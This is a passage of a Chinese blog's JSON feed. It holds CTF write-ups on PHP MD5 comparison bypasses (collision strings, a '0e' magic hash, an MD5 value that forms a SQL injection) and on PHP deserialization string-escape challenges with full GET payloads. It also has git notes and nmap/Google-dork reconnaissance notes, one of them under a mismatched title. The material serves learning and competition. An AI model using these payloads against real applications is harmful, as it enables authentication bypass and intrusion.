punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!==</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Yes\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"No\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"not set\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>那么前面两种方法都不行了，因为用 <code>(string)</code>  转换后， <code>a</code> 、 <code>b</code>  的值均为字符串 <code>Array</code></p>\n<p>这里采用 MD5 碰撞</p>\n<p>以下为 MD5 值相同的字符串</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 第一组</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$Param1</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\\x4d\\xc9\\x68\\xff\\x0e\\xe3\\x5c\\x20\\x95\\x72\\xd4\\x77\\x7b\\x72\\x15\\x87\\xd3\\x6f\\xa7\\xb2\\x1b\\xdc\\x56\\xb7\\x4a\\x3d\\xc0\\x78\\x3e\\x7b\\x95\\x18\\xaf\\xbf\\xa2\\x00\\xa8\\x28\\x4b\\xf3\\x6e\\x8e\\x4b\\x55\\xb3\\x5f\\x42\\x75\\x93\\xd8\\x49\\x67\\x6d\\xa0\\xd1\\x55\\x5d\\x83\\x60\\xfb\\x5f\\x07\\xfe\\xa2\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$Param2</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\\x4d\\xc9\\x68\\xff\\x0e\\xe3\\x5c\\x20\\x95\\x72\\xd4\\x77\\x7b\\x72\\x15\\x87\\xd3\\x6f\\xa7\\xb2\\x1b\\xdc\\x56\\xb7\\x4a\\x3d\\xc0\\x78\\x3e\\x7b\\x95\\x18\\xaf\\xbf\\xa2\\x02\\xa8\\x28\\x4b\\xf3\\x6e\\x8e\\x4b\\x55\\xb3\\x5f\\x42\\x75\\x93\\xd8\\x49\\x67\\x6d\\xa0\\xd1\\xd5\\x5d\\x83\\x60\\xfb\\x5f\\x07\\xfe\\xa2\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// 第二组</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$data1</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\\xd1\\x31\\xdd\\x02\\xc5\\xe6\\xee\\xc4\\x69\\x3d\\x9a\\x06\\x98\\xaf\\xf9\\x5c\\x2f\\xca\\xb5\\x07\\x12\\x46\\x7e\\xab\\x40\\x04\\x58\\x3e\\xb8\\xfb\\x7f\\x89\\x55\\xad\\x34\\x06\\x09\\xf4\\xb3\\x02\\x83\\xe4\\x88\\x83\\x25\\xf1\\x41\\x5a\\x08\\x51\\x25\\xe8\\xf7\\xcd\\xc9\\x9f\\xd9\\x1d\\xbd\\x72\\x80\\x37\\x3c\\x5b\\xd8\\x82\\x3e\\x31\\x56\\x34\\x8f\\x5b\\xae\\x6d\\xac\\xd4\\x36\\xc9\\x19\\xc6\\xdd\\x53\\xe2\\x34\\x87\\xda\\x03\\xfd\\x02\\x39\\x63\\x06\\xd2\\x48\\xcd\\xa0\\xe9\\x9f\\x33\\x42\\x0f\\x57\\x7e\\xe8\\xce\\x54\\xb6\\x70\\x80\\x28\\x0d\\x1e\\xc6\\x98\\x21\\xbc\\xb6\\xa8\\x83\\x93\\x96\\xf9\\x65\\xab\\x6f\\xf7\\x2a\\x70\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$data2</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\\xd1\\x31\\xdd\\x02\\xc5\\xe6\\xee\\xc4\\x69\\x3d\\x9a\\x06\\x98\\xaf\\xf9\\x5c\\x2f\\xca\\xb5\\x87\\x12\\x46\\x7e\\xab\\x40\\x04\\x58\\x3e\\xb8\\xfb\\x7f\\x89\\x55\\xad\\x34\\x06\\x09\\xf4\\xb3\\x02\\x83\\xe4\\x88\\x83\\x25\\x71\\x41\\x5a\\x08\\x51\\x25\\xe8\\xf7\\xcd\\xc9\\x9f\\xd9\\x1d\\xbd\\xf2\\x80\\x37\\x3c\\x5b\\xd8\\x82\\x3e\\x31\\x56\\x34\\x8f\\x5b\\xae\\x6d\\xac\\xd4\\x36\\xc9\\x19\\xc6\\xdd\\x53\\xe2\\xb4\\x87\\xda\\x03\\xfd\\x02\\x39\\x63\\x06\\xd2\\x48\\xcd\\xa0\\xe9\\x9f\\x33\\x42\\x0f\\x57\\x7e\\xe8\\xce\\x54\\xb6\\x70\\x80\\xa8\\x0d\\x1e\\xc6\\x98\\x21\\xbc\\xb6\\xa8\\x83\\x93\\x96\\xf9\\x65\\x2b\\x6f\\xf7\\x2a\\x70\"</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><h1 id=\"本身等于其-md5-值-弱类型比较\"><a class=\"anchor\" href=\"#本身等于其-md5-值-弱类型比较\">#</a> 本身等于其 MD5 值 (弱类型比较)</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">==</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p><code>a</code>  可取 <code>0e215962017</code></p>\n<p>原因为 <code>md5($a) = 0e291242476940776845150308577824</code></p>\n<p>比较时按数字进行比较</p>\n<h1 id=\"md5-与-sql-注入\"><a class=\"anchor\" href=\"#md5-与-sql-注入\">#</a> md5 与 SQL 注入</h1>\n<p><code>ffifdyop</code></p>\n<p><code>md5(\"ffifdyop\", true)</code> , 得到 <code>'or'6É]™é!r,ùíb</code></p>\n<p>这恰好为 SQL 注入的字符型注入</p>\n",
            "tags": [
                "CTF"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/d762243c/",
            "url": "http://dpm12345.cn/posts/d762243c/",
            "title": "HFUTC1CTF2021",
            "date_published": "2022-07-23T12:10:32.000Z",
            "content_html": "<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"warmup\"><a href=\"#warmup\" class=\"headerlink\" title=\"warmup\"></a>warmup</h2><h2 id=\"version\"><a href=\"#version\" class=\"headerlink\" title=\"version\"></a>version</h2><h2 id=\"baby-escape\"><a href=\"#baby-escape\" class=\"headerlink\" title=\"baby escape\"></a>baby escape</h2><pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\nclass Foo\n{\n    public $key;\n    public $test = 'nonono';\n    public function __construct($k)\n    {\n        $this-&gt;key = $k;\n    }\n}\n$k = $_GET['k'];\nif (isset($k)) {\n    $foo = new Foo($k);\n    $msg = str_replace('HFUT', 'C1CTF_IS_FUN', serialize($foo));\n    $foo_ultimate = unserialize($msg);\n    if ($foo_ultimate-&gt;test === 'C1CTF_IS_FUN') {\n        echo ($flag);\n    } else {\n        echo (\"what are you doing??\");\n    }\n}\n</code></pre>\n<p>很明显为反序列化字符串逃逸4–&gt;12，增加了8个字符 将最后的代码放到网页文件跑一下就行</p>\n<p>由于<code>test</code>在<code>key</code>，那么必然要提前闭合，在之前就序列化<code>test</code>的值 </p>\n<p>所以<code>key</code>的后半部分必为<code>s:4:\"test\";s:12:\"C1CTF_IS_FUN\";}</code></p>\n<p>先进行上述字符串的序列化，得到</p>\n<pre><code class=\"php\">O:3:\"Foo\":2:{s:3:\"key\";s:32:\"s:4:\"test\";s:12:\"C1CTF_IS_FUN\";}\";s:4:\"test\";s:6:\"nonono\";}\n</code></pre>\n<p>计算<code>key</code>的值的前引号后第一个(即<code>s</code>) 到第一个<code>}</code>的长度，为32 ，恰好为4个8，但由于需要闭合前一个引号，故总共为34个字符（闭合引号，分号)</p>\n<p>所以需要5个<code>HUFT</code>，为了匹配，可在<code>}</code>后加6个字符(因为已经提前结束，无影响)</p>\n<p>故 payload 为</p>\n<pre><code class=\"raw\">k=HFUTHFUTHFUTHFUTHFUT\";s:4:\"test\";s:12:\"C1CTF_IS_FUN\";};;;;;;\n</code></pre>\n<h2 id=\"easy-escape\"><a href=\"#easy-escape\" class=\"headerlink\" title=\"easy escape\"></a>easy escape</h2><p>最后构造的两个类为</p>\n<pre><code class=\"php\">$foo1 = new Foo4(\"C1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUN\", '\";s:1:\"a\";s:0:\"\";s:4:\"test\";s:4:\"HFUT\";s:1:\"b\";s:0:\"\";}');\n$foo2 = new Foo4(\"C1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUN\", '\";s:4:\"test\";s:4:\"HFUT\";s:1:\"b\";s:0:\"\";s:5:\"space\";s:0:\"\";}');\n</code></pre>\n<p>源代码</p>\n<pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\nclass Foo1\n{\n    public $space;\n    public $a;\n    public $test = 'nonono';\n    public $b;\n    public function __construct($a, $b)\n    {\n        $this-&gt;a = $a;\n        $this-&gt;b = $b;\n    }\n}\nclass Foo2\n{\n    public $b;\n    public $test = 'nonono';\n    public $a;\n    public $space;\n    public function __construct($a, $b)\n    {\n        $this-&gt;a = $a;\n        $this-&gt;b = $b;\n    }\n}\nclass Foo3\n{\n    public $a;\n    public $b;\n    public $space;\n    public $test = 'nonono';\n    public function __construct($a, $b)\n    {\n        $this-&gt;a = $a;\n        $this-&gt;b = $b;\n    }\n}\nclass Foo4\n{\n    public $a;\n    public $test = 'nonono';\n    public $b;\n    public $space;\n    public function __construct($a, $b)\n    {\n        $this-&gt;a = $a;\n        $this-&gt;b = $b;\n    }\n}\n$a1 = $_GET['a1'];\n$b1 = $_GET['b1'];\n$a2 = $_GET['a2'];\n$b2 = $_GET['b2'];\n$choice1 = \"Foo1\";\n$choice2 = \"Foo1\";\nif (isset($_COOKIE[\"choice1\"]) &amp;&amp; isset($_COOKIE[\"choice2\"])) {\n    $choice1 = $_COOKIE[\"choice1\"];\n    $choice2 = $_COOKIE[\"choice2\"];\n}\nif (isset($a1) &amp;&amp; isset($b1) &amp;&amp; isset($a2) &amp;&amp; isset($b2)) {\n    switch ($choice1) {\n        case \"Foo1\":\n            $foo1 = new Foo1($a1, $b1);\n            break;\n        case \"Foo2\":\n            $foo1 = new Foo2($a1, $b1);\n            break;\n        case \"Foo3\":\n            $foo1 = new Foo3($a1, $b1);\n            break;\n        case \"Foo4\":\n            $foo1 = new Foo4($a1, $b1);\n            break;\n        default:\n            $foo1 = new Foo1($a1, $b1);\n    }\n    switch ($choice2) {\n        case \"Foo1\":\n            $foo2 = new Foo1($a2, $b2);\n            break;\n        case \"Foo2\":\n            $foo2 = new Foo2($a2, $b2);\n            break;\n        case \"Foo3\":\n            $foo2 = new Foo3($a2, $b2);\n            break;\n        case \"Foo4\":\n            $foo2 = new Foo4($a2, $b2);\n            break;\n        default:\n            $foo2 = new Foo1($a2, $b2);\n    }\n    $msg1 = str_replace('C1CTF_IS_FUN', 'HFUT', serialize($foo1));\n    $msg2 = str_replace('C1CTF_IS_FUN', 'HFUT', serialize($foo2));\n    $foo_ultimate1 = unserialize($msg1);\n    $foo_ultimate2 = unserialize($msg2);\n    if ($foo_ultimate1-&gt;test === 'HFUT' &amp;&amp; $foo_ultimate1-&gt;a === '' &amp;&amp; $foo_ultimate1-&gt;b === '') {\n        if ($foo_ultimate2-&gt;test === 'HFUT' &amp;&amp; $foo_ultimate2-&gt;b === '' &amp;&amp; $foo_ultimate2-&gt;space === '') {\n            echo ($flag);\n        } else {\n            echo (\"what are you fuxking doing??\");\n        }\n    }\n}\n</code></pre>\n<p>代码分析得最重要部分为后半部分的</p>\n<pre><code class=\"php\">$msg1 = str_replace('C1CTF_IS_FUN', 'HFUT', serialize($foo1));\n$msg2 = str_replace('C1CTF_IS_FUN', 'HFUT', serialize($foo2));\n$foo_ultimate1 = unserialize($msg1);\n$foo_ultimate2 = unserialize($msg2);\nif ($foo_ultimate1-&gt;test === 'HFUT' &amp;&amp; $foo_ultimate1-&gt;a === '' &amp;&amp; $foo_ultimate1-&gt;b === '') {\n    if ($foo_ultimate2-&gt;test === 'HFUT' &amp;&amp; $foo_ultimate2-&gt;b === '' &amp;&amp; $foo_ultimate2-&gt;space === '') {\n        echo ($flag);\n    } else {\n        echo (\"what are you fuxking doing??\");\n    }\n}\n</code></pre>\n<p>看到字符串过滤，很容易想到字符串逃逸，</p>\n<h3 id=\"对第一个-if-判断\"><a href=\"#对第一个-if-判断\" class=\"headerlink\" title=\"对第一个 if 判断\"></a>对第一个 if 判断</h3><p>这里的主要思想为：当<code>$a</code>的字符串比较长时，通过过滤，字符串缩短，使得后面的<code>$b</code>的一部分值包含在变量a的序列化中，即如<code>s:1:\"b\";s:59:\"</code>包含在其中，使得b的序列化并未开始，由于此时冒号后面可自动添加序列化字符串，那么可在原b变量上加上需要满足条件的序列化字符串，即<code>s:1:\"a\";s:0:\"\";s:4:\"test\";s:4:\"HFUT\";s:1:\"b\";s:0:\"\";</code>,为了能够使其序列化成功，可在最后加上<code>}</code>，使其提前结束。</p>\n<p>那么接下来的主力工作是要让a的序列化字符串长度在过滤后恰能到达b的字符串值的前引号的位置，由于对space无要求，在以上分析中，只需a在b前即可，即可选用Foo1，Foo3，Foo4三个类，这里采用Foo4</p>\n<p>首先输入空值进行序列化操作，得到</p>\n<pre><code class=\"php\">O:4:\"Foo4\":4:{s:1:\"a\";s:0:\"\";s:4:\"test\";s:6:\"nonono\";s:1:\"b\";s:0:\"\";s:5:\"space\";N;}\n</code></pre>\n<p>计算从a的值的后引号到b的值的前引号的长度，发现为39个，不是12-4=8的倍数，为了满足，可在b的值开头加上任意一个字符(这里使用双引号)，使到其位置恰为40个，为8的5倍，那么a的值应为5个 <code>C1CTF_IS_FUN</code>，据此，前半部分payload为</p>\n<pre><code class=\"php\">a1=C1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUN&amp;b1=\";s:1:\"a\";s:0:\"\";s:4:\"test\";s:4:\"HFUT\";s:1:\"b\";s:0:\"\";}\n</code></pre>\n<h3 id=\"对第二个-if-判断\"><a href=\"#对第二个-if-判断\" class=\"headerlink\" title=\"对第二个 if 判断\"></a>对第二个 if 判断</h3><p>同理，通过 a的序列化字符串覆盖部分b的值</p>\n<p>那么根据第一个的分析a必须在b的前面，而在第二个判断中对space有要求，那么space必须在a的后面(此前试过在前面，无法正常序列化)。因此，可选择的类有Foo3、Foo4，由于对于Foo4来说，此时的判断只是增加了对space的赋值，只会对b2的赋值有影响，所以如果选用Foo4 ，a2的值仍为5个<code>C1CTF_IS_FUN</code>，而对Foo3来说，中间少了test的序列化字符串，后引号到前引号的长度有所改变，要重新计算 <code>C1CTF_IS_FUN</code>的个数并凑齐倍数，所以为了方便这里还是使用Foo4由于此时对a的值无要求，对space有要求，因此此时<code>b2=\";s:4:\"test\";s:4:\"HFUT\";s:1:\"b\";s:0:\"\";s:5:\"space\";s:0:\"\";}</code>故后半部分payload</p>\n<pre><code class=\"php\">a2=C1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUN&amp;b2=\";s:4:\"test\";s:4:\"HFUT\";s:1:\"b\";s:0:\"\";s:5:\"space\";s:0:\"\";}\n</code></pre>\n<p>故最后的 payload</p>\n<p><strong>GET</strong></p>\n<pre><code class=\"php\">a1=C1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUN&amp;b1=\";s:1:\"a\";s:0:\"\";s:4:\"test\";s:4:\"HFUT\";s:1:\"b\";s:0:\"\";}&amp;a2=C1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUN&amp;b2=\";s:4:\"test\";s:4:\"HFUT\";s:1:\"b\";s:0:\"\";s:5:\"space\";s:0:\"\";}\n</code></pre>\n<p><strong>SESSION</strong></p>\n<pre><code class=\"raw\">choice1 = Foo4\nchoice2 = Foo4\n</code></pre>\n<h3 id=\"同理，第二个使用-Foo3\"><a href=\"#同理，第二个使用-Foo3\" class=\"headerlink\" title=\"同理，第二个使用 Foo3\"></a>同理，第二个使用 Foo3</h3><p>先空字符序列化，得到</p>\n<pre><code class=\"php\">O:4:\"Foo3\":4:{s:1:\"a\";s:0:\"\";s:1:\"b\";s:0:\"\";s:5:\"space\";N;s:4:\"test\";s:6:\"nonono\";}\n</code></pre>\n<p>只有15个字符，那么只需要2个<code>C1CTF_IS_FUN</code>,b添加一个字符即可，故payload为</p>\n<p><strong>GET</strong></p>\n<pre><code class=\"php\">a1=C1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUN&amp;b1=\";s:1:\"a\";s:0:\"\";s:4:\"test\";s:4:\"HFUT\";s:1:\"b\";s:0:\"\";}&amp;a2=C1CTF_IS_FUNC1CTF_IS_FUN&amp;b2=\";s:4:\"test\";s:4:\"HFUT\";s:1:\"b\";s:0:\"\";s:5:\"space\";s:0:\"\";}\n</code></pre>\n<p><strong>SESSION</strong></p>\n<pre><code class=\"raw\">choice1 = Foo4\nchoice2 = Foo3\n</code></pre>\n<p>同理，对于第一个类的更换也是如此进行</p>\n<h2 id=\"baby-php\"><a href=\"#baby-php\" class=\"headerlink\" title=\"baby php\"></a>baby php</h2><h2 id=\"baby-calculator\"><a href=\"#baby-calculator\" class=\"headerlink\" title=\"baby calculator\"></a>baby calculator</h2><h2 id=\"real-calculator\"><a href=\"#real-calculator\" class=\"headerlink\" title=\"real calculator\"></a>real calculator</h2><h1 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h1><h2 id=\"bigjpg\"><a href=\"#bigjpg\" class=\"headerlink\" title=\"bigjpg\"></a>bigjpg</h2><h2 id=\"音乐带师\"><a href=\"#音乐带师\" class=\"headerlink\" title=\"音乐带师\"></a>音乐带师</h2><h2 id=\"osint\"><a href=\"#osint\" class=\"headerlink\" title=\"osint\"></a>osint</h2><h2 id=\"幸运饼干\"><a href=\"#幸运饼干\" class=\"headerlink\" title=\"幸运饼干\"></a>幸运饼干</h2><h2 id=\"signin\"><a href=\"#signin\" class=\"headerlink\" title=\"signin\"></a>signin</h2><p>AES解密</p>\n<h2 id=\"qrcode\"><a href=\"#qrcode\" class=\"headerlink\" title=\"qrcode\"></a>qrcode</h2><p>下载得到的rar是损坏文件，用winhex将第一行第三个改为<code>72</code>，保存解压， 得到一个图片和一个txt文件。打开图片发现图片一闪一闪。那么将该图片用ps打开， 到对应图层，发现二维码部分缺失，这时用仿制图章将左下角分别复制到左上和右上，扫描后得到flag</p>\n<h1 id=\"Crypto\"><a href=\"#Crypto\" class=\"headerlink\" title=\"Crypto\"></a>Crypto</h1><h2 id=\"嘀嘀嘀\"><a href=\"#嘀嘀嘀\" class=\"headerlink\" title=\"嘀嘀嘀\"></a>嘀嘀嘀</h2><p>点开题目首先确认为摩斯密码，解码后得到一串字母，因题目提示栅栏，故栅栏解密， 当组字数为8时，注意到从右往左为”flagis…..”,由此写程序反转字符串，再将flag内容与flag格式结合得到flag</p>\n",
            "tags": [
                "CTF",
                "笔记"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/e28ceec1/",
            "url": "http://dpm12345.cn/posts/e28ceec1/",
            "title": "git学习",
            "date_published": "2022-07-22T19:28:35.000Z",
            "content_html": "<p>Git 为分布式版本控制工具</p>\n<h1 id=\"工作流程\"><a href=\"#工作流程\" class=\"headerlink\" title=\"工作流程\"></a>工作流程</h1><p>工作区 ——&gt; 暂存区 ——&gt; 本地库（——&gt; 代码托管平台）</p>\n<pre><code class=\"bash\">git status ——&gt;git add 文件名——&gt; git commit -m message 文件名（——&gt;git push）\n查看目前状态     添加到暂存区         提交到本地库\t\t\t\t推送到代码托管平台\n</code></pre>\n<h1 id=\"常用命令\"><a href=\"#常用命令\" class=\"headerlink\" title=\"常用命令\"></a>常用命令</h1><h2 id=\"设置用户签名\"><a href=\"#设置用户签名\" class=\"headerlink\" title=\"设置用户签名\"></a>设置用户签名</h2><p><code>git config --global user.name 用户名</code></p>\n<p><code>git config --global user.email 邮箱</code></p>\n<h2 id=\"初始化本地库\"><a href=\"#初始化本地库\" class=\"headerlink\" title=\"初始化本地库\"></a>初始化本地库</h2><p><code>git init</code>生成一个<code>.git</code>文件夹</p>\n<h2 id=\"查看本地库状态\"><a href=\"#查看本地库状态\" class=\"headerlink\" title=\"查看本地库状态\"></a>查看本地库状态</h2><p>git status</p>\n<h2 id=\"添加到暂存区\"><a href=\"#添加到暂存区\" class=\"headerlink\" title=\"添加到暂存区\"></a>添加到暂存区</h2><p><code>git add</code>文件名</p>\n<h2 id=\"提交到本地库\"><a href=\"#提交到本地库\" class=\"headerlink\" title=\"提交到本地库\"></a>提交到本地库</h2><p><code>git commit -m \"日志信息\" 文件名</code></p>\n<h2 id=\"查看历史记录\"><a href=\"#查看历史记录\" class=\"headerlink\" title=\"查看历史记录\"></a>查看历史记录</h2><p><code>git reflog</code>（精简）</p>\n<p><code>git log</code>(更为详细)</p>\n<h2 id=\"版本穿梭\"><a href=\"#版本穿梭\" class=\"headerlink\" title=\"版本穿梭\"></a>版本穿梭</h2><p><code>git reset --hard 版本号</code></p>\n<h2 id=\"分支操作\"><a href=\"#分支操作\" class=\"headerlink\" title=\"分支操作\"></a>分支操作</h2><h2 id=\"创建分支\"><a href=\"#创建分支\" class=\"headerlink\" title=\"创建分支\"></a>创建分支</h2><p><code>git branch 分支名</code></p>\n<h3 id=\"查看所有分支\"><a href=\"#查看所有分支\" class=\"headerlink\" title=\"查看所有分支\"></a>查看所有分支</h3><p><code>git branch -v</code></p>\n<h3 id=\"切换到指定分支\"><a href=\"#切换到指定分支\" class=\"headerlink\" title=\"切换到指定分支\"></a>切换到指定分支</h3><p><code>git checkout 分支名</code></p>\n<h3 id=\"合并分支到当前分支\"><a href=\"#合并分支到当前分支\" class=\"headerlink\" title=\"合并分支到当前分支\"></a>合并分支到当前分支</h3><p><code>git merge 分支名</code></p>\n<p>即若处于<code>master</code>分支，若执行<code>git merge fork1</code>，那么会将分支<code>fork1</code>合并到<code>master</code>分支，其中合并后的内容取决于修改内容，若两个分支均对同一个文件进行修改，则需要手动进行合并操作</p>\n",
            "tags": [
                "git"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/558506d6/",
            "url": "http://dpm12345.cn/posts/558506d6/",
            "title": "MD5常见绕过",
            "date_published": "2022-07-22T15:10:32.000Z",
            "content_html": "<h1 id=\"Maltego\"><a href=\"#Maltego\" class=\"headerlink\" title=\"Maltego\"></a>Maltego</h1><h1 id=\"Nmap\"><a href=\"#Nmap\" class=\"headerlink\" title=\"Nmap\"></a>Nmap</h1><h2 id=\"扫描类型\"><a href=\"#扫描类型\" class=\"headerlink\" title=\"扫描类型\"></a>扫描类型</h2><ul>\n<li><p>-sT TCP 连接扫描，需要建立三次握手，会在目标主机中记录大量的链接请求和错误信息</p>\n</li>\n<li><p>-sS SYN 扫描，不建立三次握手，很少有系统记入日志，默认使用，需要 root (admin) 权</p>\n</li>\n<li><p>-sP Ping 扫描，默认使用，只有能 Ping 得通才会继续扫描</p>\n</li>\n<li><p>-PO 扫描之前不需要 Ping，用于绕过防火墙禁 Ping 功能</p>\n</li>\n<li><p>-sA 用来穿过防火墙的规则集 (ACK 置位)，扫描端口时效果不好:</p>\n</li>\n<li><p>-sV 探测服务版本信息 (服务指纹)</p>\n</li>\n<li><p>-sU UDP 扫描，扫描主机开启的 UDP 的服务，速度慢，结果不可靠</p>\n</li>\n</ul>\n<h2 id=\"扫描参数\"><a href=\"#扫描参数\" class=\"headerlink\" title=\"扫描参数\"></a>扫描参数</h2><ul>\n<li><p>-v 显示扫描过程，推荐使用</p>\n</li>\n<li><p>-p 指定端口号，如 [1-65535],[22, 135, 1 433,3306,] 等格式</p>\n</li>\n<li><p>-O 启动远程操作系统监测，存在误报</p>\n</li>\n<li><p>-A 全面系统监测，使用脚本检测，扫描等，系统指纹)</p>\n</li>\n<li><p>-T4 针对 TCP 端口禁止动态扫描延迟超过 10ms</p>\n</li>\n<li><p>-iL 批量扫描，读取主机列表，如 [-iL /home/ip.txt]</p>\n</li>\n<li><p>-oG 将扫描结果输出到某个文件</p>\n</li>\n<li><p>fping -a-g 192.1 68.157.0192.1 68.157.200 -q &gt;/tmp/alive.txt</p>\n</li>\n<li><p>Nmap -sS -iL /tmp/alive.txt</p>\n</li>\n<li><p>Nmap -p80，443 –script=http-waf-detect safedog.cn // 扫描 waf</p>\n</li>\n<li><p>wafw0Of safedog.cn // 扫描 waf</p>\n</li>\n</ul>\n<h1 id=\"P0f\"><a href=\"#P0f\" class=\"headerlink\" title=\"P0f\"></a>P0f</h1><p>被动指纹识别工具，通过分析目标主机发出的数据包，对主机上的操作系统进行鉴别，即使目标主机上安装有防火墙设备。</p>\n<p>能识别以下信息:</p>\n<ul>\n<li>操作系统类型 </li>\n<li>端口 </li>\n<li>系统启动时间 </li>\n<li>是否运行于防火墙之后 </li>\n<li>是否运行于 NAT 模式</li>\n</ul>\n<p>使用：</p>\n<ul>\n<li>p0f [.. 选项..] [‘ 过滤规则 ‘ ] <ul>\n<li>-i 指定监听的网络接口 </li>\n<li>-r 分析已抓取到的网络数据文件 </li>\n<li>-p 将网卡设置为混杂模式 </li>\n<li>-L 列出所有可用接口 </li>\n<li>-o 将信息写入指定的文件</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"Google-Hack-Google-搜索\"><a href=\"#Google-Hack-Google-搜索\" class=\"headerlink\" title=\"Google Hack (Google 搜索)\"></a>Google Hack (Google 搜索)</h1><ul>\n<li><p>默认模糊搜索，会自动进行词语拆分，加引号，会严格搜索被引住的内容，如 (web 渗透测试)</p>\n</li>\n<li><p>通配符，与双引号同时使用， * 表示匹配任意关键字，. 表示匹配任意字符，如 (“web * 渗透测试”)</p>\n</li>\n<li><p>布尔逻辑，默认情况下，多个关键字之间带空格时，表示逻辑与的关系，如果是逻辑或，用 | 来分隔 (可配置括号使用)，如 (web (渗透 | 测试))。</p>\n</li>\n<li><p>逻辑非用 (- 关键字)，如 (“web 测试”- 渗透), intitle 在网页标题中进行搜索，如 ( intitle: “web 渗透”)</p>\n</li>\n<li><p>Intext 在网页或文档正文中进行搜索，如 (intitle: 渗透 intext:(kali|web) )</p>\n</li>\n<li><p>inurl 网页链接中搜索，如: (inurl:phpmyadmin/index.php (intext:username password))</p>\n</li>\n<li><p>filetype , 对搜索的文档类型进行限定，支持的文档有: pdf、 ppt、 doC、xls， 支持的网页文件有: htm、asp、php，如: (web 渗透 filetype:pdf)</p>\n</li>\n<li><p>cache, 想要搜索某个被修改之前的网页，如: cache:aliyun.com</p>\n</li>\n<li><p>related, 搜索某 - - 类相关的网址，如: related:aliyun.com</p>\n</li>\n<li><p>link，搜索所有链接到某一个特定 URL 上的页面，如：(link:freebuf. com -site:freebuf.com)</p>\n</li>\n<li><p>site，将搜索范围限制在某个网站或域名中，如：(web 渗透 site:freebuf.com)</p>\n</li>\n</ul>\n",
            "tags": [
                "CTF",
                "kali",
                "nmap"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/9794bd28/",
